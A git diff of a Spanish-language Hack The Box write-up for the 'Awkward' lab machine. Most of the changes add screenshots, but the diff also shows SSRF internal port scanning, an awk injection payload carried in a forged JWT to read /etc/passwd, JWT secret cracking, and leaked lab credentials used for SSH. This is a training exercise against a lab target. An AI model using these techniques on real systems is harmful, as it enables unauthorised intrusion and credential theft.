@@ -1,7 +1,10 @@
 # 10.10.11.185 - Akward
------------------------
+![Awkward](https://user-images.githubusercontent.com/96772264/221432924-eade6e3f-dcd6-4b8b-8b55-2447fe789bb4.png)
 
-# Part 1:Enumeracion
+-----------------------
+Disclaimer: En partes de esta maquina he tenido que tirar de Writeups porque mas que media ha sido bastante hard.
+
+## Part 1:Enumeracion
 
 Puertos abiertos 22,80:
 ```console
@@ -10,6 +13,8 @@ Puertos abiertos 22,80:
 Añadimos hat-valley al etc-hosts.
 La web parece una tienda de sombreros que está en el inicio de su desarollo. Hay una seccion de "Nuestro equipo"
 con nombres interesantes que añadir a un fichero de usauriarios (para futuros ataques)
+
+![awkward1](https://user-images.githubusercontent.com/96772264/221432722-d593564e-b596-4a50-8ebd-9f9de6a5ae90.PNG)
 
 El codigo fuente nos revela que estamos ante un "jquery 3.0.0"
 ```console
@@ -35,8 +40,7 @@ Store es un nginx 1.18.0 pero que nos pide credenciales que no tenemos para acce
 000045228:   401        7 L      12 W       188 Ch      "http://store.hat-valley.htb//"
 ```
 -----------------------------------------
-
-# Part 2: Encontrando rutas ocultas
+## Part 2: Encontrando rutas ocultas
 
 ```console
 └─$ curl -s http://hat-valley.htb/js/app.js > app.js
@@ -52,6 +56,7 @@ Store es un nginx 1.18.0 pero que nos pide credenciales que no tenemos para acce
 ```
 La ruta "hr" tiene contenido, un panel de login.
 En la seccion de cookies (click derecho/inspect element/storage) hay un token cuyo valor es guest. 
+![akward2](https://user-images.githubusercontent.com/96772264/221432728-1e7c290e-16d2-4bb9-a9b9-4cc6abb33fd1.PNG)
 
 Si lo cambiamos a "admin"
 En la seccion "leave" nos dice que lo que pongamos lo vera la tal Christine
@@ -73,6 +78,7 @@ Aun asi tenemos la ruta "api". Si hacemos una peticion POST
 └─$ curl -s -X POST http://hat-valley.htb/api/submit-leave -H "Content-Type: application/json"  -d '{"user":"Crhistine"}'
 Invalid user
 ```
+![awkward8](https://user-images.githubusercontent.com/96772264/221432797-7c3d4f99-9a68-40b7-9114-5de9faedfe5f.PNG)
 
 Si en network filtramos por api y toqueteamos dentro de hr
 ```
@@ -82,8 +88,9 @@ Si en network filtramos por api y toqueteamos dentro de hr
 /api/store-status -> http://hat-valley.htb/api/store-status?url="http://store.hat-valley.htb"
 ```
 -------------------------------------------------------------
-# Part 3: SSRF
+## Part 3: SSRF
 
+Explotamos mas la ruta **/api/store-status**
 ```console
 └─$ curl -s 'http://hat-valley.htb/api/store-status?url="http://10.10.14.7"' 
 # Peticion get con -> sudo python3 -m http.server 80;
@@ -92,9 +99,7 @@ Si en network filtramos por api y toqueteamos dentro de hr
 Content-Length: 132                                                                                               └─$ curl -s 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:81"' -i | grep "Content-Length:"
 Content-Length: 0
 ```
-
 Probamos con un internal port discovery:
-
 ```console
 └─$ wfuzz -t 200 --hh=0 -z range,0000-9999 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"'
 000000081:   200        8 L      13 W       132 Ch      "0080"
@@ -102,13 +107,12 @@ Probamos con un internal port discovery:
 000008081:   200        54 L     163 W      2881 Ch     "8080"
 ```
 
-La web del puerto 80 es la de hat-valley. La del 8080 tiene el mismo codigo js. Lo interesante es la del puerto 
-3002 Como el codigo es muy largo lo ideal es volcarlo en un index.html y verlo haciendo un servidor 
-en el localhost.
-
+La web del puerto 80 es la de hat-valley. La del 8080 tiene el mismo codigo js. Lo interesante es la del puerto 3002 Como el codigo es muy largo 
+lo ideal es volcarlo en un index.html y verlo haciendo un servidor en el localhost.
 ```console
 └─$ curl -s 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:3002"' > index.html;
 ```
+![akward3](https://user-images.githubusercontent.com/96772264/221432830-feb2b8a7-e58c-44cc-aac4-31a980c9207b.PNG)
 
 De entre todo el codigo encontramos:
 ```
@@ -123,8 +127,7 @@ app.get('/api/all-leave', (req, res) => {
 ```
 
 Segun esto la cookie tiene el campo username y de ahi saca el usaurio y se lo pasa al comando awk de bash.
-Pero pasa evitar "SO command inyection" filtra caracteres especiales como la ";"
-AWK es un comando para filtrar cosas en un archivo.
+Pero pasa evitar "SO command inyection" filtra caracteres especiales como la ";" AWK es un comando para filtrar cosas en un archivo.
 
 ```console
 └─$ echo "cucuxii123 456" > prueba # Prueba equivale al "/var/www/private/leave_requests.csv"
@@ -140,7 +143,7 @@ AWK es un comando para filtrar cosas en un archivo.
 Por tanto el username tiene que ser ```/' /etc/passwd '``` Pero sin el secreto no podemos crear cookies.
 
 --------------------------------------------
-# Part 4: Consiguiendo la llave la cookie
+## Part 4: Consiguiendo la llave la cookie
 
 ```console
 └─$ curl -s 'http://hat-valley.htb/api/staff-details' | jq 
@@ -164,6 +167,7 @@ Su cookie es:
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1NjgwNDcwfQ.1lRSAkmfilspBEASNzPB8qnd1QomSFaDdCvWwAro9iw
 ```
+
 Sacamos el secreto para crear cookies...
 ```console
 └─$ ./jwt2john.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c..." > hash
@@ -171,7 +175,7 @@ Sacamos el secreto para crear cookies...
 ```
 
 --------------------------------------------
-# Part 5: LFI mediante la cookie
+## Part 5: LFI mediante la cookie
 
 Si en jwt.io cogemos la cookie de Christofer y le modificamos el user a ```/' /etc/passwd '```
 ```console
@@ -182,6 +186,8 @@ christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
 └─$ curl -s http://hat-valley.htb/api/all-leave -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
 root:x:0:0:root:/root:/bin/bash
 ```
+![awkward5](https://user-images.githubusercontent.com/96772264/221432884-4aa94d76-abeb-4a3e-93b0-c9b15449d3fd.PNG)
+
 Como hacer cada cookie manualmente con el jwt.io es un poco rollo, mejor hacer un script en python que lo 
 automatize todo.
 ```python
@@ -241,12 +247,12 @@ directorios vacios. Queremos encontrar credenciales en ese mar de archivos.
 └─$ sshpass -p '014mrbeanrules!#P' ssh bean@10.10.11.185
 ```
 --------------------------------------------
-# Part 6: Explotacion de script php en el subdominio
+## Part 6: Explotacion de script php en el subdominio
 
-Corremos mi [script de reconocimiento](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh),
-basicamente no encontramos nada interesante salvo que en esta ruta "/etc/nginx/conf.d/.htpasswd" 
-encuentra las creds "admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1". Pero no hay manera de romperlas.
-Aun asi tenemos las de antes 'bean.hill:014mrbeanrules!#P' que probamos a ver si nos sirven en store.
+Corremos mi [script de reconocimiento](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh), basicamente no encontramos nada
+interesante salvo que en esta ruta "/etc/nginx/conf.d/.htpasswd" encuentra las creds "admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1".
+Pero no hay manera de romperlas. Aun asi tenemos las de antes 'bean.hill:014mrbeanrules!#P' que probamos a ver si nos sirven en store.
+![Uploading awkward6.PNG…]()
 
 ```console
 └─$ curl -s http://store.hat-valley.htb/ -u 'bean:014mrbeanrules!#P'
@@ -293,6 +299,7 @@ Es una web en produccion por lo que está en sus primeras fases de creación.
 
 En la web, si escojo un item y le doy a "añadir a la carta" se tramita esta peticion:
 ```/POST http://store.hat-valley.htb/cart_actions.php item=1&user=5315-735b-5b5-8ce2&action=add_item```
+![Uploading awkward7.PNG…]()
 
 No tiene sentido hacer SQLi porque nos habian avisado que no existe tal. 
 Tampoco intentaremos hacer muchas inyecciones por el tema "badchars".
